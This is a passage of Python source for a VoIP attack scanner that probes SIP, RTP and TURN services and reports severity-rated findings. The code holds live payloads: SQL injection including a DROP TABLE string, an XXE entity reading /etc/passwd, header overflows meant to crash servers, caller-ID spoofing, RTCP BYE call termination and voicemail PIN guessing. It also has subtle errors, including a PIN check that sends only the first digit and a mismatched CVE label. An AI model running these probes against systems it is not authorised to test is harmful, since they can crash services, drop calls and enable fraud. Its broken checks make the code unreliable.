            safe(_sip_forking(ip,state),        "forking"),
            safe(_sip_topology_leak(ip,state),  "topology"),
            safe(_sip_sqli(ip,state),           "sqli"),
            safe(_sip_xxe(ip,state),            "xxe"),
            safe(_sip_caller_id_spoof(ip,state),"callerid"),
            safe(_sip_pcharge_fraud(ip,state),  "pcharge"),
            safe(_sip_prack_abuse(ip,state),    "prack"),
            safe(_sip_session_id(ip,state),     "session_id"),
            safe(_sip_ws_probe(ip,state),       "ws_probe"),
            safe(_sip_tls_probe(ip,state),      "tls"),
        )

    await asyncio.gather(*[_sem_probe(sem, sip_all, ip) for ip in state.live_ips])
    Con.ok(f"Phase 4 complete — SIP enumeration done on {len(state.live_ips)} hosts")


async def _sip_method_fuzz(ip,st):
    for method in SIP_METHODS_ALL:
        extra = "Expires: 60\r\n" if method in ("REGISTER","SUBSCRIBE") else ""
        extra += "Event: presence\r\n" if method=="SUBSCRIBE" else ""
        pkt  = sip_msg(method,ip,extra_hdrs=extra)
        resp = await sip_probe(ip,5060,pkt,timeout=5)
        if not resp: continue
        # REFER accepted: must be 200/202 — means server will route calls without auth
        if method=="REFER" and re.search(r"SIP/2\.0 (200|202)",resp):
            await st.finding(ip,"MISCONFIGURATION","Unauthenticated REFER Accepted","CRITICAL",
                "Server accepted REFER without auth — toll fraud risk",f"sip://{ip}:5060")
        # SUBSCRIBE/NOTIFY: only meaningful if 200 OK — not 401/403
        if method in ("SUBSCRIBE","NOTIFY") and re.search(r"SIP/2\.0 200 OK",resp):
            await st.finding(ip,"MISCONFIGURATION",f"Unauth {method} Accepted","MEDIUM",
                f"200 OK to unauthenticated {method}",f"sip://{ip}:5060")
        # MESSAGE: 200 OK means SMS/IM relay possible without auth
        if method=="MESSAGE" and re.search(r"SIP/2\.0 200 OK",resp):
            await st.finding(ip,"MISCONFIGURATION","Unauthenticated MESSAGE Accepted","MEDIUM",
                "SIP MESSAGE (IM) accepted without auth",f"sip://{ip}:5060")
        # UPDATE: 200 OK means session modification without auth
        if method=="UPDATE" and re.search(r"SIP/2\.0 200 OK",resp):
            await st.finding(ip,"MISCONFIGURATION","Unauthenticated UPDATE Accepted","MEDIUM",
                "UPDATE accepted without auth — session modification possible",
                f"sip://{ip}:5060")


async def _sip_version_leak(ip,st):
    resp = await sip_probe(ip,5060,sip_msg("OPTIONS",ip),timeout=5)
    if not resp: return
    for line in resp.splitlines():
        if re.match(r"^(Server|User-Agent):",line,re.I):
            # Only report if version number is revealed (not just generic name)
            if re.search(r'\d+\.\d+', line):
                await st.finding(ip,"INFO-DISCLOSURE","SIP Version Header Exposed","LOW",
                    line.strip(),f"sip://{ip}:5060")
            return


async def _sip_anon_reg(ip,st):
    extra = "To: <sip:anonymous@anonymous>\r\nExpires: 60\r\n"
    pkt   = sip_msg("REGISTER",ip,from_user="anonymous",extra_hdrs=extra)
    resp  = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and re.search(r"SIP/2\.0 200 OK",resp):
        await st.finding(ip,"MISCONFIGURATION","Anonymous SIP REGISTER Allowed","HIGH",
            "REGISTER succeeded without credentials",f"sip://{ip}:5060")


async def _sip_malformed_via(ip,st):
    raw = (f"OPTIONS sip:{ip} SIP/2.0\r\n"
           f"Via: SIP/2.0/UDP AAAA"+"A"*2048+f";branch=z9hG4bK-fuzz\r\n"
           f"To: <sip:{ip}>\r\nFrom: <sip:fuzz@scanner>;tag=fuzz\r\n"
           f"Call-ID: fuzz@scanner\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n"
           ).encode()
    # Send twice to distinguish crash from normal 500 on oversized input
    resp1 = await sip_probe(ip,5060,raw,timeout=5)
    resp2 = await sip_probe(ip,5060,sip_msg("OPTIONS",ip),timeout=3)
    if resp1 and "500" in resp1:
        await st.finding(ip,"FUZZING","Oversized Via Header → 500 Error","HIGH",
            "Potential parsing bug — server returned 500 on oversized Via header",
            f"sip://{ip}:5060")
    elif resp1 and not resp2:
        # Server crashed and is no longer responding
        await st.finding(ip,"FUZZING","Oversized Via Header → Server Crash","CRITICAL",
            "Server stopped responding after oversized Via header — parser crash",
            f"sip://{ip}:5060")


async def _sip_maxfwd_zero(ip,st):
    pkt  = sip_msg("OPTIONS",ip,extra_hdrs="Max-Forwards: 0\r\n")
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    # RFC 3261 §8.1.1.6: MUST return 483 Too Many Hops. 200 OK is a misconfiguration.
    if resp and re.search(r"SIP/2\.0 200 OK",resp):
        await st.finding(ip,"MISCONFIGURATION","Max-Forwards: 0 Not Rejected (should 483)","LOW",
            "Should return 483 Too Many Hops (RFC 3261 §8.1.1.6)",f"sip://{ip}:5060")


async def _sip_large_header(ip,st):
    pkt = sip_msg("REGISTER",ip,
                  extra_hdrs="Contact: <sip:"+"A"*8192+"@scanner>\r\n")
    resp1 = await sip_probe(ip,5060,pkt,timeout=5)
    resp2 = await sip_probe(ip,5060,sip_msg("OPTIONS",ip),timeout=3)
    if resp1 and "500" in resp1:
        await st.finding(ip,"FUZZING","Oversized Contact Header → 500 Error","HIGH",
            "Possible buffer overflow in SIP contact parsing",f"sip://{ip}:5060")
    elif resp1 and not resp2:
        await st.finding(ip,"FUZZING","Oversized Contact Header → Server Crash","CRITICAL",
            "Server unresponsive after oversized Contact header",f"sip://{ip}:5060")


async def _sip_null_bytes(ip,st):
    pkt  = sip_msg("OPTIONS",ip,extra_hdrs="X-Custom: null\x00byte\r\n")
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    # Interesting only if server accepted it (200) without 400 Bad Request
    if resp and re.search(r"SIP/2\.0 200",resp):
        await st.finding(ip,"FUZZING","Null Bytes in SIP Header Accepted","MEDIUM",
            "Stack processed null bytes in headers without rejection",f"sip://{ip}:5060")


async def _sip_route_abuse(ip,st):
    pkt  = sip_msg("INVITE",ip,extra_hdrs="Route: <sip:attacker.invalid;lr>\r\n",body=sdp(ip))
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    # Only report if the response includes the Route header forwarded — indicating loose routing
    if resp and "200 OK" in resp and "attacker.invalid" in resp:
        await st.finding(ip,"MISCONFIGURATION","Loose Route Header Forwarded to External Host","HIGH",
            "Server forwarded Route header to attacker.invalid — open proxy risk",
            f"sip://{ip}:5060")
    elif resp and "200 OK" in resp:
        await st.finding(ip,"MISCONFIGURATION","External Route Header Accepted","MEDIUM",
            "INVITE with external Route accepted — confirm proxy abuse manually",
            f"sip://{ip}:5060")


async def _sip_early_media(ip,st):
    pkt  = sip_msg("INVITE",ip,extra_hdrs="Supported: 100rel\r\n",body=sdp(ip))
    resp = await sip_probe(ip,5060,pkt,timeout=6)
    if resp and "183 Session Progress" in resp and "m=audio" in resp:
        await st.finding(ip,"EXPOSURE","SIP Early Media (183) Exposes RTP Params","MEDIUM",
            "183 Session Progress returned SDP — attacker can inject RTP before answer",
            f"sip://{ip}:5060")


async def _sip_forking(ip,st):
    extra = ("Contact: <sip:fork1@scanner:5061>\r\n"
             "Contact: <sip:fork2@scanner:5062>\r\n")
    pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
    resp = await sip_probe(ip,5060,pkt,timeout=6)
    # Only flag on 180/200 — 100 Trying is just acknowledgment and always expected
    if resp and re.search(r"SIP/2\.0 (180|200)",resp):
        await st.finding(ip,"EXPOSURE","SIP Forking Accepted — Multiple Contacts Alerted","LOW",
            "Server forked INVITE to multiple contacts — confirm authorization policy",
            f"sip://{ip}:5060")


async def _sip_topology_leak(ip,st):
    pkt  = sip_msg("OPTIONS",ip)
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if not resp: return
    private = _PRIVATE_IP_RE.findall(resp)
    if private:
        await st.finding(ip,"INFO-DISCLOSURE","Internal IP Topology Exposed via SIP","MEDIUM",
            f"Private IPs leaked: {list(set(private))}",f"sip://{ip}:5060")


async def _sip_sqli(ip,st):
    """SIP SQL injection — only report if we see actual DB error patterns in response."""
    for payload in ["' OR '1'='1","1; DROP TABLE cdr--","' UNION SELECT 1,2,3--"]:
        extra = f"From: <sip:{payload}@scanner>;tag={_sid()[:8]}\r\n"
        pkt   = sip_msg("REGISTER",ip,extra_hdrs=extra)
        resp  = await sip_probe(ip,5060,pkt,timeout=5)
        if resp and DB_ERROR_PATTERNS.search(resp):
            await st.finding(ip,"INJECTION","SQL Injection via SIP From Header — Error Confirmed",
                "HIGH",
                f"Payload '{payload}' triggered DB error in response",
                f"sip://{ip}:5060")
            return
        # Secondary check: significant response time difference (>2s) may indicate blind SQLi
        elif resp:
            t0 = time.monotonic()
            sleep_payload = "'; WAITFOR DELAY '0:0:3'--"
            extra2 = f"From: <sip:{sleep_payload}@scanner>;tag={_sid()[:8]}\r\n"
            pkt2 = sip_msg("REGISTER",ip,extra_hdrs=extra2)
            await sip_probe(ip,5060,pkt2,timeout=6)
            elapsed = time.monotonic()-t0
            if elapsed >= 2.8:
                await st.finding(ip,"INJECTION","Blind SQL Injection via SIP — Time-Based Delay","HIGH",
                    f"Time-based SQLi: response delayed {elapsed:.1f}s on WAITFOR payload",
                    f"sip://{ip}:5060")
                return


async def _sip_xxe(ip,st):
    """XXE via SIP NOTIFY — only report if file content appears in response."""
    xml  = ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<pres><note>&xxe;</note></pres>')
    pkt  = sip_msg("NOTIFY",ip,extra_hdrs="Event: presence\r\n",body=xml)
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and FILE_READ_PATTERNS.search(resp):
        await st.finding(ip,"INJECTION","XXE via SIP NOTIFY — /etc/passwd Content Confirmed",
            "CRITICAL","File content returned via XXE in NOTIFY response",
            f"sip://{ip}:5060")


async def _sip_caller_id_spoof(ip,st):
    extra = ("P-Asserted-Identity: <sip:emergency@psap.invalid>\r\n"
             "P-Preferred-Identity: <sip:911@psap.invalid>\r\nPrivacy: none\r\n")
    pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    # Only flag on 180 Ringing or 200 OK — not 100 Trying (which is just ACK)
    if resp and re.search(r"SIP/2\.0 (180|183|200)",resp):
        await st.finding(ip,"MISCONFIGURATION","Caller-ID/P-Asserted-Identity Spoofing Accepted",
            "HIGH",
            "Server accepted spoofed P-Asserted-Identity and rang/answered — vishing risk",
            f"sip://{ip}:5060")


async def _sip_pcharge_fraud(ip,st):
    extra = ("P-Charge-Info: <sip:premium-billing@carrier.invalid>\r\n"
             f"P-Asserted-Identity: <sip:free-user@{ip}>\r\n")
    pkt  = sip_msg("INVITE",ip,extra_hdrs=extra.format(ip=ip),body=sdp(ip))
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and re.search(r"SIP/2\.0 (180|183|200)",resp):
        await st.finding(ip,"MISCONFIGURATION","P-Charge-Info Billing Fraud Vector","HIGH",
            "Server accepted P-Charge-Info without validation — billing fraud possible",
            f"sip://{ip}:5060")


async def _sip_prack_abuse(ip,st):
    pkt  = sip_msg("PRACK",ip,extra_hdrs="Require: 100rel\r\nRAck: 1 1 INVITE\r\n")
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and re.search(r"SIP/2\.0 200 OK",resp):
        await st.finding(ip,"MISCONFIGURATION","Out-of-Dialog PRACK Accepted","LOW",
            "PRACK accepted without an existing dialog (RFC 3262)",f"sip://{ip}:5060")


async def _sip_session_id(ip,st):
    extra = "Session-ID: aabbccdd00001111aabbccdd00001111;remote=00000000000000000000000000000000\r\n"
    pkt  = sip_msg("OPTIONS",ip,extra_hdrs=extra)
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and "Session-ID" in resp and "aabbccdd" in resp.lower():
        await st.finding(ip,"INFO-DISCLOSURE","Session-ID Header Reflected","LOW",
            "RFC 7989 Session-ID echoed — session tracking possible",
            f"sip://{ip}:5060")


async def _sip_ws_probe(ip,st):
    ws_handshake = (
        f"GET /ws HTTP/1.1\r\nHost: {ip}\r\n"
        "Upgrade: websocket\r\nConnection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "Sec-WebSocket-Protocol: sip\r\n\r\n"
    ).encode()
    for port in [80,443,8080,5062,8088]:
        resp = await tcp_xfer(ip,port,ws_handshake,timeout=5)
        if resp and b"101 Switching Protocols" in resp and b"sip" in resp.lower():
            await st.finding(ip,"EXPOSURE","SIP over WebSocket (RFC 7118) Enabled","MEDIUM",
                f"WebSocket SIP upgrade accepted on port {port}",
                f"ws://{ip}:{port}/ws")
            return


async def _sip_tls_probe(ip,st):
    """Check if SIP TLS (port 5061) is available and what certificate it presents."""
    if not await tcp_open(ip, 5061, timeout=3.0):
        return
    # Try TLS client hello — if port 5061 is open but not TLS, note plaintext SIP on TLS port
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        loop = asyncio.get_running_loop()
        def _check():
            try:
                s = socket.create_connection((ip, 5061), timeout=4)
                ss = ctx.wrap_socket(s, server_hostname=ip)
                cert = ss.getpeercert(binary_form=False)
                ss.close()
                return cert
            except ssl.SSLError as e:
                return str(e)
            except Exception:
                return None
        result = await asyncio.wait_for(loop.run_in_executor(None, _check), timeout=6)
        if isinstance(result, str) and "WRONG_VERSION" in result:
            await st.finding(ip,"MISCONFIGURATION","Port 5061 Open But Not TLS","MEDIUM",
                "SIP TLS port 5061 is open but not serving TLS — potential misconfiguration",
                f"tcp://{ip}:5061")
        elif isinstance(result, dict):
            # Check for expired or self-signed cert
            not_after = result.get("notAfter","")
            if not_after:
                try:
                    exp = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                    if exp < datetime.utcnow():
                        await st.finding(ip,"WEAK-CRYPTO",f"SIP TLS Certificate Expired: {not_after}",
                            "MEDIUM","Expired TLS cert — clients may accept self-signed replacements",
                            f"tls://{ip}:5061")
                except Exception:
                    pass
    except Exception:
        pass

# ══════════════════════════════════════════════════════════
# PHASE 5 — Extension Scanning
# ══════════════════════════════════════════════════════════
async def phase5_extensions(state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 5 │ EXTENSION SCANNING · VOICEMAIL BRUTEFORCE · IVR BYPASS")
    if not state.live_ips:
        Con.warn("No live hosts — skipping extension scan"); return

    async def scan_ip(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_ext_register_scan(ip,state), "ext_reg"),
            safe(_ext_options_enum(ip,state),  "ext_opts"),
            safe(_voicemail_access(ip,state),  "voicemail"),
            safe(_ivr_bypass(ip,state),        "ivr"),
            safe(_vm_pin_brute(ip,state),      "vm_pin"),
            safe(_timing_oracle(ip,state),     "timing"),
        )

    await asyncio.gather(*[_sem_probe(sem, scan_ip, ip) for ip in state.live_ips])
    Con.ok(f"Phase 5 complete — {len(state.valid_extensions)} valid extensions found")


async def _ext_register_scan(ip,st):
    _BATCH = 20  # Probe extensions in parallel batches for speed

    async def _probe_ext(ext):
        ext_s = str(ext)
        extra = (f"To: <sip:{ext_s}@{ip}>\r\nFrom: <sip:{ext_s}@{ip}>;tag={_sid()[:8]}\r\n"
                 f"Expires: 60\r\n")
        pkt  = sip_msg("REGISTER", ip, extra_hdrs=extra)
        resp = await sip_probe(ip, 5060, pkt, timeout=3)
        if not resp:
            return
        code_m = _SIP_STATUS_RE.search(resp)
        code_s = code_m.group(1) if code_m else "?"
        if code_s in ("401","407","403","200"):
            if ext_s not in [e.split(":")[-1] for e in st.valid_extensions]:
                st.valid_extensions.append(f"{ip}:{ext_s}")
                Con.info(f"Extension {col(ext_s,'cyan')} @ {ip} — SIP/{code_s}")
            if code_s == "200":
                await st.finding(ip,"MISCONFIGURATION",
                    f"Extension {ext_s} REGISTER Without Auth","CRITICAL",
                    "Auth disabled — call hijack possible",f"sip://{ip}:5060/ext={ext_s}")

    for i in range(0, len(EXTENSION_RANGES), _BATCH):
        batch = EXTENSION_RANGES[i:i + _BATCH]
        await asyncio.gather(*[_probe_ext(ext) for ext in batch])


async def _ext_options_enum(ip,st):
    """User enumeration via OPTIONS — 200 vs 404 reveals existence."""
    exts = [100,101,102,200,201,1000,1001,9999,"admin","reception"]

    async def _probe(ext):
        ext_s = str(ext)
        pkt  = sip_msg("OPTIONS",ip,to_user=ext_s)
        resp = await sip_probe(ip,5060,pkt,timeout=3)
        return ext_s, resp

    results = await asyncio.gather(*[_probe(e) for e in exts], return_exceptions=True)
    for item in results:
        if isinstance(item, Exception): continue
        ext_s, resp = item
        if resp and re.search(r"SIP/2\.0 200 OK",resp):
            key = f"{ip}:{ext_s}"
            if key not in st.valid_extensions:
                st.valid_extensions.append(key)
            await st.finding(ip,"INFO-DISCLOSURE",
                f"Extension {ext_s} Enumerable via OPTIONS 200","LOW",
                "OPTIONS returns 200 for valid user, 404 for invalid",
                f"sip://{ip}:5060/ext={ext_s}")


async def _voicemail_access(ip,st):
    async def _probe(vext):
        extra = (f"To: <sip:{vext}@{ip}>\r\n"
                 f"From: <sip:scanner@scanner>;tag=vm\r\n")
        pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
        resp = await sip_probe(ip,5060,pkt,timeout=4)
        return vext, resp

    results = await asyncio.gather(*[_probe(v) for v in VOICEMAIL_EXTS], return_exceptions=True)
    for item in results:
        if isinstance(item, Exception): continue
        vext, resp = item
        if resp and re.search(r"SIP/2\.0 (200|183)",resp):
            await st.finding(ip,"MISCONFIGURATION",
                f"Voicemail {vext} Reachable Without Auth","HIGH",
                "Voicemail answered unauthenticated INVITE",f"sip://{ip}:5060/ext={vext}")


async def _ivr_bypass(ip,st):
    async def _probe(ext):
        extra = f"To: <sip:{ext}@{ip}>\r\nFrom: <sip:scanner@scanner>;tag=ivr\r\n"
        pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
        resp = await sip_probe(ip,5060,pkt,timeout=4)
        return ext, resp

    results = await asyncio.gather(
        *[_probe(e) for e in ["0","*","#","operator","00","O"]],
        return_exceptions=True)
    for item in results:
        if isinstance(item, Exception): continue
        ext, resp = item
        if resp and re.search(r"SIP/2\.0 (200|183)",resp):
            await st.finding(ip,"MISCONFIGURATION",
                f"IVR Bypass via Extension '{ext}'","MEDIUM",
                "Extension answered without auth — IVR bypass",
                f"sip://{ip}:5060/ext={ext}")
            return


async def _vm_pin_brute(ip,st):
    """Brute-force voicemail PIN via DTMF INFO — all pins in parallel."""
    pins = ["0000","1234","4321","1111","2222","9999","0123","1212",
            "7890","0987","1357","2468","1470","1020","8520","3698",
            "0001","0011","0111","1000","0100","0010"]

    async def _probe(pin):
        dtmf = f"Signal={pin[0]}\r\nDuration=160\r\n"
        extra = (f"To: <sip:8500@{ip}>\r\n"
                 f"From: <sip:scanner@scanner>;tag=pin{_sid()[:6]}\r\n"
                 f"Content-Type: application/dtmf-relay\r\n")
        pkt = sip_msg("INFO",ip,extra_hdrs=extra,body=dtmf)
        return await sip_probe(ip,5060,pkt,timeout=3)

    results = await asyncio.gather(*[_probe(p) for p in pins], return_exceptions=True)
    for resp in results:
        if isinstance(resp, Exception): continue
        if resp and re.search(r"SIP/2\.0 200 OK",resp):
            await st.finding(ip,"MISCONFIGURATION","Out-of-Dialog DTMF INFO Accepted","MEDIUM",
                "Server accepted INFO+DTMF without dialog — PIN harvest risk",
                f"sip://{ip}:5060")
            return


async def _timing_oracle(ip,st):
    """Timing oracle for user enumeration."""
    times = {}
    for user in ["admin","100","999999"]:
        pkt = sip_msg("REGISTER",ip,from_user=user,
                      extra_hdrs=f"To: <sip:{user}@{ip}>\r\nExpires: 60\r\n")
        t0 = time.monotonic()
        resp = await sip_probe(ip,5060,pkt,timeout=5)
        times[user] = (time.monotonic()-t0, resp is not None)
    valid_t = [t for u,(t,ok) in times.items() if ok]
    if len(valid_t)>=2 and max(valid_t)-min(valid_t)>0.5:
        await st.finding(ip,"EXPOSURE","SIP Timing Oracle — User Enumeration","MEDIUM",
            f"Response time variance {max(valid_t)-min(valid_t):.2f}s — valid users respond faster",
            f"sip://{ip}:5060")

# ══════════════════════════════════════════════════════════
# PHASE 6 — RTP / RTCP / Media Security
# ══════════════════════════════════════════════════════════
async def phase6_rtp(state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 6 │ RTP · RTCP · SRTP · MEDIA SECURITY TESTING")
    if not state.live_ips:
        Con.warn("No live hosts — skipping media phase"); return

    async def rtp_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_rtcp_probe(ip,state),        "rtcp"),
            safe(_rtp_port_range(ip,state),    "rtp_range"),
            safe(_srtp_enforce(ip,state),      "srtp"),
            safe(_rtp_inject(ip,state),        "rtp_inject"),
            safe(_rtcp_bye_inject(ip,state),   "rtcp_bye"),
            safe(_srtp_downgrade(ip,state),    "srtp_down"),
            safe(_dtls_fingerprint(ip,state),  "dtls"),
            safe(_rtp_ssrc_hijack(ip,state),   "ssrc"),
        )

    await asyncio.gather(*[_sem_probe(sem, rtp_all, ip) for ip in state.live_ips])
    Con.ok("Phase 6 complete — RTP/RTCP tests done")


async def _rtcp_probe(ip,st):
    rtcp = b"\x80\xc9\x00\x01\x00\x00\x00\x00"
    results = await asyncio.gather(
        *[udp_xfer(ip, port, rtcp, timeout=2) for port in RTCP_PORTS],
        return_exceptions=True)
    for port, resp in zip(RTCP_PORTS, results):
        if isinstance(resp, Exception): continue
        if resp and len(resp)>=8:
            await st.finding(ip,"EXPOSURE",f"RTCP Port {port} Open","LOW",
                "RTCP responding — session statistics may be exposed",
                f"udp://{ip}:{port}")


async def _rtp_port_range(ip,st):
    results = await asyncio.gather(
        *[udp_xfer(ip, p, b"\x00\x00", timeout=1.5) for p in RTP_SAMPLE],
        return_exceptions=True,
    )
    open_cnt = sum(1 for r in results if isinstance(r, bytes) and r is not None)
    if open_cnt>=2:
        await st.finding(ip,"EXPOSURE","RTP Port Range Exposed","MEDIUM",
            f"{open_cnt} RTP ports reachable — restrict media range",
            f"udp://{ip}:16384-32767")


async def _srtp_enforce(ip,st):
    pkt  = sip_msg("INVITE",ip,body=sdp(ip,secure=False))
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    # 200 OK AND no RTP/SAVP in response means server didn't enforce encryption
    if resp and re.search(r"SIP/2\.0 200 OK",resp) and "RTP/SAVP" not in resp:
        await st.finding(ip,"MISCONFIGURATION","SRTP Not Enforced — Plaintext RTP Accepted","HIGH",
            "Server accepted unencrypted RTP INVITE and did not upgrade to SRTP",
            f"sip://{ip}:5060")


async def _rtp_inject(ip,st):
    ssrc    = random.randint(0,0xFFFFFFFF)
    rtp_hdr = struct.pack("!BBHII",0x80,0x00,1,0,ssrc)
    rtp_pkt = rtp_hdr + b"\x00"*160
    ports   = [16384,20000,10000]
    results = await asyncio.gather(
        *[udp_xfer(ip, port, rtp_pkt, timeout=2) for port in ports],
        return_exceptions=True)
    for port, resp in zip(ports, results):
        if isinstance(resp, Exception): continue
        if resp and len(resp)>10:
            await st.finding(ip,"EXPOSURE","Blind RTP Injection Accepted","MEDIUM",
                f"UDP port {port} processed unsolicited RTP — enable SRTP",
                f"udp://{ip}:{port}")
            return


async def _rtcp_bye_inject(ip,st):
    ssrc     = random.randint(0,0xFFFFFFFF)
    rtcp_bye = struct.pack("!BBHI",0x81,0xcb,0x0001,ssrc)
    for port in [5005,7001,16385]:
        resp = await udp_xfer(ip,port,rtcp_bye,timeout=2)
        if resp is not None:
            await st.finding(ip,"EXPOSURE","RTCP BYE Injection Accepted","HIGH",
                f"RTCP BYE processed on port {port} — active calls can be terminated",
                f"udp://{ip}:{port}")
            return


async def _srtp_downgrade(ip,st):
    sdp_dual = (f"v=0\r\no=s 0 0 IN IP4 {ip}\r\ns=-\r\nc=IN IP4 {ip}\r\nt=0 0\r\n"
                f"m=audio 16384 RTP/SAVP 0\r\n"
                f"a=crypto:1 AES_CM_128_HMAC_SHA1_80 inline:{_sid()}\r\n"
                f"a=rtpmap:0 PCMU/8000\r\n"
                f"m=audio 16386 RTP/AVP 0\r\na=rtpmap:0 PCMU/8000\r\n")
    pkt = sip_msg("INVITE",ip,body=sdp_dual)
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and re.search(r"SIP/2\.0 200 OK",resp) \
            and "RTP/AVP" in resp and "RTP/SAVP" not in resp:
        await st.finding(ip,"MISCONFIGURATION","Media Encryption Downgrade Accepted","HIGH",
            "Server chose plain RTP over SRTP — MITM eavesdropping possible",
            f"sip://{ip}:5060")


async def _dtls_fingerprint(ip,st):
    pkt = sip_msg("INVITE",ip,
                  extra_hdrs="Supported: dtls-srtp\r\n",
                  body=(sdp(ip)+"a=fingerprint:sha-256 AA:BB:CC:DD:EE:FF:"
                        "00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:"
                        "00:11:22:33:44:55:66:77:88:99\r\na=setup:actpass\r\n"))
    resp = await sip_probe(ip,5060,pkt,timeout=5)
    if resp and re.search(r"SIP/2\.0 200 OK",resp) and "fingerprint" in resp.lower():
        # Check if our injected fake fingerprint was mirrored (CVE-2020-14871 pattern)
        if "AA:BB:CC:DD" in resp:
            await st.finding(ip,"EXPOSURE","DTLS-SRTP Fingerprint Mirrored (Possible CVE-2020-14871)",
                "MEDIUM","Server mirrored our fingerprint — verify fingerprint validation",
                f"sip://{ip}:5060")


async def _rtp_ssrc_hijack(ip,st):
    for ssrc_guess in [0x00000001,0xDEADBEEF,0x12345678]:
        rtp_hdr = struct.pack("!BBHII",0x80,0x00,random.randint(1,65535),
                              random.randint(0,0xFFFFFFFF),ssrc_guess)
        for port in [16384,16386,20000]:
            resp = await udp_xfer(ip,port,rtp_hdr+b"\x00"*160,timeout=2)
            if resp and len(resp)>=12:
                await st.finding(ip,"EXPOSURE","RTP SSRC Collision Response","MEDIUM",
                    f"Port {port} responded to SSRC {hex(ssrc_guess)} — SSRC hijack possible",
                    f"udp://{ip}:{port}")
                return

# ══════════════════════════════════════════════════════════
# PHASE 7 — STUN / TURN / ICE Testing
# ══════════════════════════════════════════════════════════
async def phase7_stun_turn(state:State, sem:asyncio.Semaphore):
    Con.phase("PHASE 7 │ STUN · TURN · ICE · WebRTC SECURITY TESTING")
    if not state.live_ips:
        Con.warn("No live hosts — skipping STUN/TURN phase"); return

    async def stun_all(ip:str):
        if ip in state.honeypot_ips: return
        await asyncio.gather(
            safe(_stun_amp(ip,state),      "stun_amp"),
            safe(_turn_relay(ip,state),    "turn_relay"),
            safe(_turn_creds(ip,state),    "turn_creds"),
            safe(_ice_harvest(ip,state),   "ice"),
        )

    await asyncio.gather(*[_sem_probe(sem, stun_all, ip) for ip in state.live_ips])
    Con.ok("Phase 7 complete — STUN/TURN testing done")


async def _stun_amp(ip,st):
    tid = os.urandom(12)
    stun = b"\x00\x01\x00\x00\x21\x12\xa4\x42" + tid
    resp = await udp_xfer(ip,STUN_PORT,stun,timeout=3)
    if resp and len(resp)>=20:
        # Verify it's a proper STUN Binding Response (0x0101)
        if resp[:2] == b"\x01\x01":
            amp = len(resp)/len(stun)
            sev = "HIGH" if amp>3 else "MEDIUM"
            await st.finding(ip,"EXPOSURE",
                f"STUN Open — Amplification Factor {amp:.1f}x",sev,
                f"STUN port {STUN_PORT} responding — DDoS amplification risk",
                f"udp://{ip}:{STUN_PORT}")


async def _turn_relay(ip,st):
    # TURN Allocate Request
    turn_alloc = b"\x00\x03\x00\x00\x21\x12\xa4\x42" + os.urandom(12)
    for port in TURN_PORTS:
        resp = await udp_xfer(ip,port,turn_alloc,timeout=3)
        if resp and len(resp)>=20:
            # Error response 0x0113 = Unauthorized (requires auth) — server is running
            # Success 0x0103 = Allocate Success — open relay!
            msg_type = resp[:2]
            if msg_type == b"\x01\x03":
                await st.finding(ip,"EXPOSURE","TURN Open Relay — Allocate Succeeded Without Auth",
                    "CRITICAL",
                    f"TURN server granted allocation on port {port} without authentication",
                    f"udp://{ip}:{port}")
                return
            elif msg_type == b"\x01\x13":
                # Auth required — server is a TURN server but requires credentials
                await st.finding(ip,"EXPOSURE","TURN Server Detected (Auth Required)","LOW",
                    f"TURN server on port {port} — test with credentials",
                    f"udp://{ip}:{port}")
                return


async def _turn_creds(ip,st):
    """Try TURN with default credentials using proper TURN authentication."""
    # TURN Allocate with REQUESTED-TRANSPORT attribute (UDP=17)
    def _build_turn_alloc_with_creds(username: str, password: str,
                                      realm: str, nonce: str) -> bytes:
        import hmac, hashlib, base64
        tid = os.urandom(12)
        ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
        key = ha1.encode()
        # Build attributes
        attrs = b""
        # USERNAME
        un = username.encode()
        attrs += b"\x00\x06" + len(un).to_bytes(2,"big") + un + b"\x00"*((-len(un))%4)
        # REALM
        rm = realm.encode()
        attrs += b"\x00\x14" + len(rm).to_bytes(2,"big") + rm + b"\x00"*((-len(rm))%4)
        # NONCE
        nc = nonce.encode()
        attrs += b"\x00\x15" + len(nc).to_bytes(2,"big") + nc + b"\x00"*((-len(nc))%4)
        # REQUESTED-TRANSPORT (UDP=17)
        attrs += b"\x00\x19\x00\x04\x11\x00\x00\x00"
        # Build message for HMAC (without MESSAGE-INTEGRITY)
        msg = b"\x00\x03" + (len(attrs)+24).to_bytes(2,"big") + b"\x21\x12\xa4\x42" + tid + attrs
        mi = hmac.new(key, msg, hashlib.sha1).digest()
        msg += b"\x00\x08\x00\x14" + mi
        return msg

    # First get realm/nonce from 401 response
    turn_plain = b"\x00\x03\x00\x04\x21\x12\xa4\x42" + os.urandom(12) + b"\x00\x19\x00\x04\x11\x00\x00\x00"
    resp = await udp_xfer(ip, 3478, turn_plain, timeout=3)
